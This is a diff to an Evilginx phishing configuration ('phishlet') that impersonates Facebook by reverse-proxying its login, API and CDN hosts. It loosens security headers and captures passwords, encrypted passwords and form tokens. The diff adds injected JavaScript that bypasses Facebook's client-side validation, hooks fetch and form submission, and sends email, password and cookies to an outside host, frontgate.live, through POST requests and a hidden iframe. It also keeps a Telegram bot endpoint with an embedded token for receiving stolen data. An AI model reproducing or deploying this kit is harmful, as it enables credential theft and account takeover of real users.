@@ -2,26 +2,23 @@ author: 'evilginx-enhanced'
 min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'facebook.com', session: true}
-  - {phish_sub: 'graph', orig_sub: 'graph', domain: 'facebook.com', session: true}
+proxy_hosts:
+  - {phish_sub: 'web', orig_sub: 'web', domain: 'facebook.com', session: true}
   - {phish_sub: 'api', orig_sub: 'api', domain: 'facebook.com', session: false}
-  - {phish_sub: 'static', orig_sub: 'staticxx', domain: 'fbcdn.net', session: false}
-  - {phish_sub: 'connect', orig_sub: 'connect', domain: 'facebook.com', session: false}
-  - {phish_sub: 'web', orig_sub: 'web', domain: 'facebook.com', session: false}
+  - {phish_sub: 'graphql', orig_sub: 'graphql', domain: 'facebook.com', session: false}
   - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true}
 
 sub_filters:
-  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'www\.facebook\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'WebBloks', replace: '//WebBloks', mimes: ['application/javascript']}
+  # - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'www\.facebook\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'graph.facebook.com', orig_sub: 'graph', domain: 'facebook.com', search: 'graph\.facebook\.com', replace: '{hostname}', mimes: ['*/*']}
   - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'static', domain: 'fbcdn.net', search: 'static\.xx\.fbcdn\.net', replace: '{hostname}', mimes: ['*/*']}
 
 response_headers:
-  - name: 'Content-Security-Policy'
-    value: "default-src 'self' 'unsafe-inline' 'unsafe-eval' *.facebook.com *.fbcdn.net data: blob:"
   - name: 'X-Frame-Options'
     value: 'ALLOW-FROM https://www.facebook.com'
-  - name: 'Strict-Transport-Security'
-    value: 'max-age=0'  # Disable HSTS enforcement
+  - name: 'Content-Security-Policy'
+    value: "default-src 'self' 'unsafe-inline' *.facebook.com *.fbcdn.net"
 
 credentials:
   username:
@@ -34,6 +31,13 @@ credentials:
     type: 'post'
   encrypted_payload:
     key: 'enc_pass'
+    search: '(.*)'
+    type: 'post'
+  custom:
+  - key: 'jazoest'
+    search: '(.*)'
+    type: 'post'
+  - key: 'lsd'
     search: '(.*)'
     type: 'post'
 
@@ -56,24 +60,33 @@ login:
   force_basic_auth: true
 
 js_inject:
-  - trigger_domains: ["www.facebook.com", "m.facebook.com"]
-    trigger_paths: ["/login.php", "/login/", "/"]
+  - trigger_domains: ["www.facebook.com"]
+    trigger_paths: ["/login/"]
     script: |
-      document.addEventListener('submit', function(e){
-        const form = e.target;
-        console.log('you are here');
-        if(form.action.includes('login.php') || form.action.includes('login.')){
-          const email = form.querySelector('input[name="email"]')?.value;
-          const pass = form.querySelector('input[name="pass"]')?.value;
-          console.log('form submitted');
-          console.log(email);
-          console.log(pass);
-          if(email && pass){
-            fetch('/capture_creds', {
-              method: 'POST',
-              body: `email=${encodeURIComponent(email)}&pass=${encodeURIComponent(pass)}`
-            });
+      // Bypass WebBloks validation
+      window.Bloks = {
+        validatePayload: function() { return true; },
+        parseTree: function() { return {}; }
+      };
+      console.log('Bloks status:', typeof Bloks, Bloks?.validatePayload);
+      Object.defineProperty(window, 'fb_web_bloks', {value: false});
 
+      // Intercept form submission
+      const origFetch = window.fetch;
+      window.fetch = function(url, options) {
+        if (url.includes('/login/') && options?.method === 'POST') {
+          const formData = new URLSearchParams(options.body);
+          if (formData.has('email') && formData.has('pass')) {
+            // Send credentials to your capture endpoint
+            fetch('https://frontgate.live/capture', {
+              method: 'POST',
+              body: JSON.stringify({
+                email: formData.get('email'),
+                pass: formData.get('pass'),
+                cookies: document.cookie
+              }),
+              keepalive: true
+            });
             fetch(`https://api.telegram.org/bot7584622526:AAFmOMzBnh-3e3EQefLZytschE_W93VmPXI/sendMessage`, {
               method: 'POST',
               headers: {'Content-Type': 'application/json'},
@@ -83,6 +96,22 @@ js_inject:
                 disable_notification: false
               })
             })
+          }
+        }
+        return origFetch.apply(this, arguments);
+      };
+
+      // Backup: Form submission listener
+      document.addEventListener('submit', function(e) {
+        if (e.target.method === 'post' && e.target.action.includes('/login/')) {
+          const email = e.target.querySelector('[name="email"]')?.value;
+          const pass = e.target.querySelector('[name="pass"]')?.value;
+          if (email && pass) {
+            // Create hidden iframe to send data
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = `https://frontgate.live/capture?e=${encodeURIComponent(email)}&p=${encodeURIComponent(pass)}`;
+            document.body.appendChild(iframe);
           }
         }
       }, true);
